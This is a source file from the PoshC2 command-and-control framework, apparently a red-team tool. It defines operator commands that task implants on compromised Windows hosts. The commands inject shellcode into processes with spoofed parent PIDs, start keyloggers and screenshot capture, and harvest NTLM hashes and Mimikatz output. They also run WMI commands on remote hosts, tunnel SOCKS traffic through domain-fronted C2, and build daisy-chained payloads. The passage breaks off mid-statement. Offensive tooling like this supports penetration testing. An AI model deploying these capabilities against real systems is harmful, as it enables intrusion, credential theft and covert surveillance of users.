import base64
import os
import re
import string
import subprocess
import traceback

from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

from poshc2 import Colours
from poshc2.Utils import argp, load_file, gen_key, get_first_url, get_first_domainfront_header, get_command_word, \
    command
from poshc2.client.Alias import cs_alias, cs_replace
from poshc2.client.cli.AutosuggestionAggregator import AutosuggestionAggregator
from poshc2.client.cli.CommandPromptCompleter import FilePathCompleter, FirstWordCompleter
from poshc2.client.cli.PoshExamplesAutosuggestions import AutoSuggestFromPoshExamples
from poshc2.client.command_handlers.CommandTags import Tag
from poshc2.client.command_handlers.CommonCommands import common_implant_commands, common_implant_commands_help, \
    common_implant_examples, common_block_help
from poshc2.server.AutoLoads import check_module_loaded, run_sharp_autoloads
from poshc2.server.Config import PoshProjectDirectory, SocksHost, PayloadsDirectory
from poshc2.server.Config import UserAgent, PBindPipeName, PBindSecret, FCommFilePath
from poshc2.server.Core import print_bad, print_good, search_help, print_command_help, build_sharp_config
from poshc2.server.ImplantType import ImplantType
from poshc2.server.PowerStatus import get_powerstatus
from poshc2.server.database.Helpers import insert_object, select_first, get_implant, get_power_status, update_object, \
    get_process_id, get_new_implant_url
from poshc2.server.database.Model import C2Server, NewTask, Implant, URL
from poshc2.server.payloads.Payloads import Payloads

commands = {}
commands.update(common_implant_commands)
commands_help = {}
commands_help.update(common_implant_commands_help)
examples = []
examples.extend(common_implant_examples)
block_help = {}
block_help.update(common_block_help)

style = Style.from_dict({
    '': '#80d130',
})

autosuggester = AutoSuggestFromPoshExamples(examples)


def cs_prompt(prefix):
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/{ImplantType.SharpHttp.get_history_file()}'),
                            auto_suggest=AutosuggestionAggregator([AutoSuggestFromHistory(), autosuggester]),
                            style=style)
    completions = list(commands.keys())
    completions.extend(examples)
    return session.prompt(f'{prefix}> ', completer=FirstWordCompleter(completions, WORD=True))


def handle_sharp_command(command, user, implant_id, command_prefix=""):
    # alias mapping
    for alias in cs_alias:
        if alias[0] == command[:len(command.rstrip())]:
            command = alias[1]

    # alias replace
    for alias in cs_replace:
        if command.startswith(alias[0]):
            command = command.replace(alias[0], alias[1])

    command = command.strip()

    if command_prefix and not command_prefix.endswith(" "):
        command_prefix += " "

    run_sharp_autoloads(command, implant_id, user, command_prefix)
    command_word = get_command_word(command)

    if command_word in commands:
        commands[command_word](user, command, implant_id, command_prefix)
        return

    if command:
        new_task = NewTask(
            implant_id=implant_id,
            command=f"{command_prefix} {command}" if command_prefix else command,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Filesystem])
def do_upload_file(user, command, implant_id, command_prefix=""):
    """
    Uploads a file to the server.

    Hides the file by default. Execution without args will prompt with a filepath completer.

    MITRE TTPs:
        {}

    Examples:
        upload-file
        upload-file -source /tmp/test.exe -destination 'c:\\temp\\test.exe' -nothidden
    """
    # TODO lots of common code
    if command == "upload-file":
        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.upload-history'),
                                auto_suggest=AutoSuggestFromHistory(), style=style)

        try:
            source = session.prompt("Location file to upload: ",
                                    completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source
        except KeyboardInterrupt:
            return

        while not os.path.isfile(source):
            print(f"File does not exist: {source}")
            source = session.prompt("Location file to upload: ",
                                    completer=FilePathCompleter(PayloadsDirectory, glob="*"))
            source = PayloadsDirectory + source

        destination = session.prompt("Location to upload to: ")
    else:
        args = argp(command)
        source = args.source
        destination = args.destination

    try:
        b64_destination = base64.b64encode(destination.encode("utf-8")).decode("utf-8")
        print("")
        print(f"Uploading {source} to {destination}")
        upload_command = f"upload-file {source} {b64_destination}"

        new_task = NewTask(
            implant_id=implant_id,
            command=f"{command_prefix} {upload_command}" if command_prefix else upload_command,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    except Exception as e:
        print_bad(f"Error with source file: {e}")
        traceback.print_exc()


@command(commands, commands_help, examples, block_help, tags=[Tag.Injection])
def do_inject_shellcode_syscall(user, command, implant_id, command_prefix=""):
    """
    Inject shellcode into a target process, obtaining an implant in that process using direct syscalls.

    Prompts for the shellcode file to use.

    Can either:
     * Provide an executable to start and inject into (default is c:\\windows\\system32\\searchprotocolhost.exe),
        * With an optional parent PID to spoof if starting an executable,
     * Or the PID of an already running process to inject into

    In either case, the ability to set the allocated memory permissions to PAGE_EXECUTE_READWRITE can be done with the rwx
    argument, if the shellcode requires it (PAGE_READWRITE for writing then PAGE_EXECUTE_READ for running is used by default).

    MITRE TTPs:
        {}

    Arguments:
        inject-shellcode-syscall [path-to-executable-to-start] [ppid-spoof] [rwx]
        inject-shellcode-syscall [pid] [rwx]
        inject-shellcode-syscall [pid]

    Examples:
        inject-shellcode-syscall c:\\windows\\system32\\svchost.exe 3422 rwx

    """
    params = re.compile("inject-shellcode-syscall", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ",
                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcode_file = load_file(path)

        if shellcode_file is not None:
            command = f"Inject-ShellcodeSyscall {base64.b64encode(shellcode_file).decode('utf-8')}{params} #{os.path.basename(path)}"
            new_task = NewTask(
                implant_id=implant_id,
                command=f"{command_prefix} {command}" if command_prefix else command,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help, tags=[Tag.Injection])
def do_inject_shellcode(user, command, implant_id, command_prefix=""):
    """
    Inject shellcode into a target process, obtaining an implant in that process.

    Prompts for the shellcode file to use.
    Can either provide an executable to run and an optional parent PID to spoof,
    or the PID of an already running process.

    MITRE TTPs:
        {}

    Examples:
        inject-shellcode c:\\windows\\system32\\svchost.exe <optional-ppid-spoof>
        inject-shellcode <pid>
    """
    params = re.compile("inject-shellcode", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ",
                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcode_file = load_file(path)

        if shellcode_file is not None:
            command = f"Inject-Shellcode {base64.b64encode(shellcode_file).decode('utf-8')}{params} #{os.path.basename(path)}"
            new_task = NewTask(
                implant_id=implant_id,
                command=f"{command_prefix} {command}" if command_prefix else command,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help, tags=[Tag.Injection])
def do_inject_shellcode_ctx(user, command, implant_id, command_prefix=""):
    """
    Inject shellcode into a target process using a stealthy CTX process, obtaining an implant in that process.

    Prompts for the shellcode file to use.
    Can either provide an executable to run and an optional parent PID to spoof,
    or the PID of an already running process.

    MITRE TTPs:
        {}

    Examples:
        inject-shellcode-ctx c:\\windows\\system32\\svchost.exe <optional-ppid-spoof>
        inject-shellcode-ctx <pid>
    """
    params = re.compile("inject-shellcode-ctx", re.IGNORECASE)
    params = params.sub("", command)
    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
                            auto_suggest=AutoSuggestFromHistory(), style=style)

    try:
        path = session.prompt("Location of shellcode file: ",
                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
        path = PayloadsDirectory + path
    except KeyboardInterrupt:
        return

    try:
        shellcodefile = load_file(path)

        if shellcodefile is not None:
            command = f"Inject-ShellcodeCTX {base64.b64encode(shellcodefile).decode('utf-8')}{params} #{os.path.basename(path)}"
            new_task = NewTask(
                implant_id=implant_id,
                command=f"{command_prefix} {command}" if command_prefix else command,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
    except Exception as e:
        print(f"Error loading file: {e}")


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_kill_implant(user, command, implant_id, command_prefix=""):
    """
    Terminates this implant and hides it from the ImplantHandler list.

    MITRE TTPs:
        {}

    Examples:
        kill-implant
    """
    implant_details = get_implant(implant_id)
    print_bad(
        "**OPSEC Warning** - kill-implant terminates the current thread not the entire process, if you want to kill the process use kill-process")
    ri = input(f"Are you sure you want to terminate the implant ID {implant_details.numeric_id}? (Y/n) ")

    if ri == "" or ri.lower() == "y":
        new_task = NewTask(
            implant_id=implant_id,
            command=f"{command_prefix} exit" if command_prefix else "exit",
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
        update_object(Implant, {Implant.alive: "No"}, {Implant.id: implant_id})
    else:
        print("Implant not terminated")


@command(commands, commands_help, examples, block_help, tags=[Tag.SOCKS, Tag.Lateral_Movement])
def do_sharpsocks(user, command, implant_id, command_prefix=""):
    """
    Starts the SharpSocks SOCKS Proxy.

    Provides a one-liner for the operator to run to launch the SharpSocks server.
    Once running, the implant will then connect to the server and traffic can be
    proxied via the C2 channel on local port 43334.

    MITRE TTPs:
        {}

    Examples:
        sharpsocks
    """
    from random import choice

    channel = "".join(choice(string.ascii_letters) for _ in range(25))
    sharp_key = gen_key().decode("utf-8")
    default_sharp_urls = select_first(C2Server.socks_urls)
    urls_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.comma-separated-urls-history'),
                                auto_suggest=AutoSuggestFromHistory(), style=style)
    socks_proxy_urls = urls_prompt.prompt(
        f"What URIs would you like to use for SharpSocks? Default is {default_sharp_urls.replace(' ', '')}: ")

    if not socks_proxy_urls:
        socks_proxy_urls = default_sharp_urls

    socks_proxy_urls = socks_proxy_urls.split(",")

    if len(socks_proxy_urls) < 2:
        print("Please specify at least two URIs")
        return

    socks_proxy_urls = [i.replace("\"", "").strip() for i in socks_proxy_urls]
    socks_proxy_urls = [(i[1:] if i.startswith("/") else i) for i in socks_proxy_urls]

    default_sharp_url = select_first(C2Server.payload_comms_host).replace('"', '').split(',')[0]
    domains_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.protocol-and-domain-history'),
                                   auto_suggest=AutoSuggestFromHistory(), style=style)
    sharp_url = domains_prompt.prompt(
        f"What domain would you like to use for SharpSocks? Default is {default_sharp_url}: ")

    if not sharp_url:
        sharp_url = default_sharp_url

    if not sharp_url.startswith("http"):
        print("Please specify a protocol (http/https)")
        return

    default_host_header = get_first_domainfront_header(select_first(C2Server.domain_front_header))
    host_headers_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.host-headers-history'),
                                        auto_suggest=AutoSuggestFromHistory(), style=style)
    host_header = host_headers_prompt.prompt(f"What host header should used? Default is {default_host_header}: ")

    if not host_header:
        host_header = default_host_header

    default_web_proxy = ""
    web_proxy_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.proxy-history-answer'),
                                     auto_suggest=AutoSuggestFromHistory(), style=style)
    web_proxy = web_proxy_prompt.prompt(f"Would you like to use an HTTP web proxy? Default is No (y/N): ")

    if web_proxy:
        default_web_proxy = "--use-proxy "
        web_proxy_destination_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.proxy-history'),
                                                     auto_suggest=AutoSuggestFromHistory(), style=style)
        web_proxy_destination = web_proxy_destination_prompt.prompt(
            f"What is the address of the HTTP web proxy (Proxy Url in format http://<server>:<port>)? Default is System wide proxy: ")

        if not web_proxy_destination:
            web_proxy_destination = default_web_proxy
        else:
            default_web_proxy += f"-m {web_proxy_destination} "
            web_proxy_username_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.proxy-username'),
                                                      auto_suggest=AutoSuggestFromHistory(), style=style)
            web_proxy_username = web_proxy_username_prompt.prompt(
                f"What username would you like SharpSocks to use for authentication? ")

            if web_proxy_username:
                default_web_proxy += f"-u {web_proxy_username} "
                web_proxy_domain_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.proxy-password'),
                                                        auto_suggest=AutoSuggestFromHistory(), style=style)
                web_proxy_domain = web_proxy_domain_prompt.prompt(
                    f"What domain name would you like SharpSocks to use for authentication? ")

                if not web_proxy_domain:
                    print("Please specify a domain for the username you provided")
                    return
                else:
                    default_web_proxy += f"-d {web_proxy_domain} "

                web_proxy_password_prompt = PromptSession(
                    history=FileHistory(f'{PoshProjectDirectory}/.proxy-password'),
                    auto_suggest=AutoSuggestFromHistory(), style=style)
                web_proxy_password = web_proxy_password_prompt.prompt(
                    f"What password would you like SharpSocks to use for authentication? ")

                if not web_proxy_password:
                    print("Please specify a password for the username you provided")
                    return
                else:
                    default_web_proxy += f"-p {web_proxy_password} "

    default_user_agent = select_first(C2Server.user_agent)
    user_agent_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.user-agents-history'),
                                      auto_suggest=AutoSuggestFromHistory(), style=style)
    user_agent = user_agent_prompt.prompt(
        f"What user agent would you like SharpSocks to use? Default is \"{default_user_agent}\": ")

    if not user_agent:
        user_agent = default_user_agent

    default_beacon = "200"
    beacon_prompt = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.beacon-history'),
                                  auto_suggest=AutoSuggestFromHistory(), style=style)
    beacon = beacon_prompt.prompt(
        f"What beacon interval would you like SharpSocks to use (ms)? Default: {default_beacon}ms: ")

    if not beacon:
        beacon = default_beacon

    if beacon.strip().endswith("ms"):
        beacon = beacon.replace("ms", "").strip()

    server_command = f"./SharpSocksServer -c={channel} -k={sharp_key} -l={SocksHost} -v"

    if " -v" in command or " --verbose" in command:
        server_command += " --verbose"

    server_command += "\n"
    print(
        Colours.GREEN + "\nOk, run this command from your SharpSocksServer directory to launch the SharpSocks server:\n")
    print(server_command)

    task = f"run-exe SharpSocksImplant.Program SharpSocksImplant {default_web_proxy} -s {sharp_url} -c {channel} -k {sharp_key} -url1 {socks_proxy_urls[0]} -url2 {socks_proxy_urls[1]} -b {beacon} -r {beacon} --session-cookie ASP.NET_SessionId --payload-cookie __RequestVerificationToken --user-agent \"{user_agent}\""

    if host_header:
        task += f" -df {host_header}"

    extra_args = command.replace("sharpsocks", "").strip()

    if extra_args:
        task += " " + extra_args

    confirm = input("Are you ready to start the SharpSocks in the implant? (Y/n) ")

    if confirm == "" or confirm.lower() == "y":
        new_task = NewTask(
            implant_id=implant_id,
            command=f"{command_prefix} {task}" if command_prefix else task,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)
    else:
        print("Aborted...")
        return

    print("SharpSocks task issued, to stop SharpSocks run stop-socks")


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_stop_keystrokes(user, command, implant_id, command_prefix=""):
    """
    Stops the keylogger from logging any more keystrokes.

    MITRE TTPs:
        {}

    Examples:
        stop-keystrokes
    """
    command = f"run-exe Logger.KeyStrokesClass Logger {command}"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: ""}, {Implant.id: implant_id})


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_start_keystrokes(user, command, implant_id, command_prefix=""):
    """
    Starts the keylogger.

    Note that the implant must be running as the user that is intended to be keylogged.

    MITRE TTPs:
        {}

    Examples:
        start-keystrokes
    """
    check_module_loaded("Logger.exe", implant_id, user, load_module_command=command_prefix)
    command = f"run-exe Logger.KeyStrokesClass Logger {command}"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: "KEYLOG"}, {Implant.id: implant_id})


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_get_keystrokes(user, command, implant_id, command_prefix=""):
    """
    Gets the logged keystrokes from the keylogger.

    MITRE TTPs:
        {}

    Examples:
        get-keystrokes
    """
    command = f"run-exe Logger.KeyStrokesClass Logger {command}"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_stop_multi_screenshot(user, command, implant_id, command_prefix=""):
    """
    Stops an existing get-multi-screenshot task.

    MITRE TTPs:
        {}

    Examples:
        stop-multi-screenshot
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: "SCREENSHOT - Stopped"}, {Implant.id: implant_id})


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_get_multi_screenshot(user, command, implant_id, command_prefix=""):
    """
    Gets multiple screenshots over a defined period, one screenshot per beacon.

    Run stop-multi-screenshot to stop the task early.

    MITRE TTPs:
        {}

    Examples:
        get-multi-screenshot 2m
    """

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: "SCREENSHOT"}, {Implant.id: implant_id})


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_get_screenshot(user, command, implant_id, command_prefix=""):
    """
    Gets a screenshot of the current desktop across all displays.

    MITRE TTPs:
        {}

    Examples:
        get-screenshot
    """

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering])
def do_stop_powerstatus(user, command, implant_id, command_prefix=""):
    """
    Stops PowerStatus monitoring.

    MITRE TTPs:
        {}

    Examples:
        stop-powerstatus
    """
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: ""}, {Implant.id: implant_id})


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering, Tag.Credential_Harvesting])
def do_get_hash(user, command, implant_id, command_prefix=""):
    """
    Runs InternalMonologue to get the NetNTLMv2 hash of the current user.

    If elevated, will return NetNTLMv1 through changing registry keys (an IOC).

    https://github.com/eladshamir/Internal-Monologue

    MITRE TTPs:
        {}

    Examples:
        get-hash
    """
    check_module_loaded("InternalMonologue.exe", implant_id, user, load_module_command=command_prefix)
    command = "run-exe InternalMonologue.Program InternalMonologue"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Data_Gathering, Tag.Credential_Harvesting])
def do_safetykatz(user, command, implant_id, command_prefix=""):
    """
    [Requires Elevation]
    Runs SafetyKatz for running Mimikatz in memory.

    https://github.com/GhostPack/SafetyKatz

    MITRE TTPs:
        {}

    Examples:
        safetykatz minidump
        safetykatz full
    """
    check_module_loaded("SafetyKatz.exe", implant_id, user, load_module_command=command_prefix)
    command = f"run-exe SafetyKatz.Program {command}"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util, Tag.Comms])
def do_enable_rotation(user, command, implant_id, command_prefix=""):
    """
    Enables comms rotation across multiple URLs.

    Prompts the operator for a list of URLs to use, then an lists of
    HTTP Host headers for any applicable domain fronting. There is a 1-to-1 relationship between the lists
    and they must be the same size.

    MITRE TTPs:
        {}

    Examples:
        enable-rotation
    """
    domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
    domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")

    command = f"dfupdate {domainfront}"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    command = f"rotate {domain}"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_sharpwmi(user, command, implant_id, command_prefix=""):
    """
    Execute a SharpWMI command.

    This is a modified version of https://github.com/GhostPack/SharpWMI/

    When executing a JS or VBS payload the operator will be prompted for which appropriate payload file to run.

    The action requires that user performing the action has privileged access to the target.
    Kerberos tickets from Rubeus can be used easily with this technique - request applicable TGT or TGSs and SharpWMI will make use of them during execution.
    If credentials are passed, then that user must be privileged.

    MITRE TTPs:
        {}

    Examples:
        sharpwmi action=query query="select * from win32_process"
        sharpwmi action=query query="select * from win32_process where name='explorer.exe'" computername=SERVER01,SERVER02
        sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
        sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02
        sharpwmi action=query query="select * from win32_process" computername=SERVER01 username=DOMAIN\\user password=Password123!
        sharpwmi action=query query="select * FROM AntiVirusProduct" namespace="root\\SecurityCenter2"
        sharpwmi action=create command="C:\\windows\\system32\\rundll32 [args]" computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
        sharpwmi action=executevbs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123! payload=base64
        sharpwmi action=executejs computername=SERVER01,SERVER02 username=DOMAIN\\user password=Password123!
    """
    check_module_loaded("SharpWMI.exe", implant_id, user, load_module_command=command_prefix)
    command = command.replace("sharpwmi", "run-exe SharpWMI.Program SharpWMI")
    if "execute" in command and "payload" not in command:
        session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
                                auto_suggest=AutoSuggestFromHistory(), style=style)

        try:
            path = session.prompt("Location of base64 vbs/js file: ",
                                  completer=FilePathCompleter(PayloadsDirectory, glob="*.b64"))
            path = PayloadsDirectory + path
        except KeyboardInterrupt:
            return

        if os.path.isfile(path):
            with open(path, "r") as p:
                payload = p.read()

            command = f"{command} payload={payload}"
            new_task = NewTask(
                implant_id=implant_id,
                command=f"{command_prefix} {command}" if command_prefix else command,
                user=user,
                child_implant_id=None
            )

            insert_object(new_task)
        else:
            print_bad("Could not find file")
    else:
        new_task = NewTask(
            implant_id=implant_id,
            command=f"{command_prefix} {command}" if command_prefix else command,
            user=user,
            child_implant_id=None
        )

        insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_pbind_connect(user, command, implant_id, command_prefix=""):
    """
    Connect to a PBind implant waiting on a target.

    If no pipename and secret are passed then the defaults are used from the configuration file
    (which are used by default in payloads).

    MITRE TTPs:
        {}

    Examples:
        pbind-connect hostname
        pbind-connect hostname <pipename> <secret>
    """
    key = select_first(C2Server.encryption_key)

    if len(command.split()) == 2:  # 'pbind-connect <hostname>' is two args
        command = f"{command} {PBindPipeName} {PBindSecret} {key}"
    elif len(command.split()) == 4:  # if the pipe name and secret are already present just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'pbind-connect <hostname>' or 'pbind-connect <hostname> <pipename> <secret>'")
        return

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_fcomm_connect(user, command, implant_id, command_prefix=""):
    """
    Connect to an FComm implant waiting on a target.

    If no filename is passed then the default is used from the configuration file
    (which is used by default in payloads).

    MITRE TTPs:
        {}

    Examples:
        fcomm-connect hostname
        fcomm-connect hostname <filepath>
    """
    key = select_first(C2Server.encryption_key)

    if len(command.split()) == 2:  # 'fcomm-connect <hostname>' is two args
        command = f"{command} {FCommFilePath} {key}"
    elif len(command.split()) == 3:  # if the pipe name and secret are already present just add the key
        command = f"{command} {key}"
    else:
        print_bad("Expected 'fcomm-connect <hostname>' or 'fcomm-connect <hostname> <filepath>'")
        return

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Util])
def do_dynamic_code(user, command, implant_id, command_prefix=""):
    """
    Compiles and runs DynamicCode.cs in the payloads directory in memory on the target.

    MITRE TTPs:
        {}

    Examples:
        dynamic-code
        dynamic-code arg1 arg2
    """
    compile_command = "mono-csc %sDynamicCode.cs -out:%sDynamicCode.exe -target:exe -warn:2 -sdk:4.5" % (
        PayloadsDirectory, PayloadsDirectory)

    try:
        subprocess.check_output(compile_command, shell=True)
    except subprocess.CalledProcessError:
        return

    os.replace(f"{PayloadsDirectory}DynamicCode.exe", f"{PayloadsDirectory}DynamicCode.exe")
    command = command.replace("dynamic-code", "").strip()
    check_module_loaded(f"{PayloadsDirectory}DynamicCode.exe", implant_id, user, True, command_prefix)
    command = f"run-exe PoshC2DynamicCode.Program DynamicCode {command}"
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help)
def do_stop_daisy(user, command, implant_id, command_prefix=""):
    """
    Stops a running daisy server.

    MITRE TTPs:
        {}

    Examples:
        stop-daisy
    """
    update_object(Implant, {Implant.label: ""}, {Implant.id: implant_id})
    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)


@command(commands, commands_help, examples, block_help, tags=[Tag.Lateral_Movement])
def do_start_daisy(user, command, implant_id, command_prefix=""):
    """
    Run a wizard to start daisy chaining, optionally creating new daisy payloads.

    MITRE TTPs:
        {}

    Examples:
        start-daisy
    """
    check_module_loaded("Daisy.dll", implant_id, user, load_module_command=command_prefix)
    elevated = input(Colours.GREEN + "Are you elevated? y/N " + Colours.END)
    proxy_user = ""
    proxy_pass = ""
    proxy_url = ""
    cred_expiry = ""
    prefix_path = ""
    bind_ip = input(Colours.GREEN + "Bind IP on the daisy host: " + Colours.END)
    bind_port = input(Colours.GREEN + "Bind port on the daisy host: " + Colours.END)
    prefix_path = input(Colours.GREEN + "URL prefix: " + Colours.END)
    prefix_path = prefix_path.strip("/")
    daisyserverip = input(Colours.GREEN + f"Daisy Server IP (leave blank for {bind_ip}): " + Colours.END)

    if daisyserverip == "":
        daisyserverip = bind_ip

    firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
    default_url = get_first_url(select_first(C2Server.payload_comms_host), None)
    default_df_header = get_first_domainfront_header(select_first(C2Server.domain_front_header))

    if default_df_header == default_url:
        default_df_header = None

    if firstdaisy.lower() == "y" or firstdaisy == "":
        upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {default_url}): " + Colours.END)
        domain_front = input(
            Colours.GREEN + f"Domain front header (leave blank for {str(default_df_header)}): " + Colours.END)
        proxy_user = input(Colours.GREEN + "Proxy username (<domain>\\<username>, leave blank if none): " + Colours.END)
        proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
        proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")

        if not upstream_url:
            upstream_url = default_url

        if not domain_front:
            if default_df_header:
                domain_front = default_df_header
            else:
                domain_front = ""
    else:
        upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server: " + Colours.END)
        upstream_daisy_port = input(Colours.GREEN + "Upstream daisy port: " + Colours.END)
        upstream_daisy_prefix = input(Colours.GREEN + "Upstream daisy prefix: " + Colours.END)

        if upstream_daisy_prefix == "":
            upstream_url = f"http://{upstream_daisy_host}:{upstream_daisy_port}"
        else:
            upstream_daisy_prefix = upstream_daisy_prefix.strip("/")
            upstream_url = f"http://{upstream_daisy_host}:{upstream_daisy_port}/{upstream_daisy_prefix}"

        domain_front = upstream_daisy_host

    urls = f"{select_first(C2Server.urls)},{select_first(C2Server.socks_urls)}".replace('"', '')
    useragent = UserAgent
    command = f"invoke-daisychain \"{bind_ip}\" \"{bind_port}\" {upstream_url} \"{domain_front}\" \"{proxy_url}\" \"{proxy_user}\" \"{proxy_pass}\" \"{useragent}\" \"{prefix_path}\" \"{urls}\""

    new_task = NewTask(
        implant_id=implant_id,
        command=f"{command_prefix} {command}" if command_prefix else command,
        user=user,
        child_implant_id=None
    )

    insert_object(new_task)
    update_object(Implant, {Implant.label: "DAISY"}, {Implant.id: implant_id})
    createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")

    if createpayloads.lower() == "y" or createpayloads == "":
        name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)
        host_implant = get_implant(implant_id)
        powershell_proxy_command = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
        c2_server = select_first(C2Server)

        url = URL(
            name=name,
            url=f"http://{daisyserverip}:{bind_port}/{prefix_path}",
            host_header="",
            proxy_url=proxy_url,
            proxy_username=proxy_user,
            proxy_password=proxy_pass,
            credential_expiry=cred_expiry
        )

        insert_object(url)

        if url.id:
            new_payload = Payloads(
                c2_server.kill_date,
                c2_server.encryption_key,
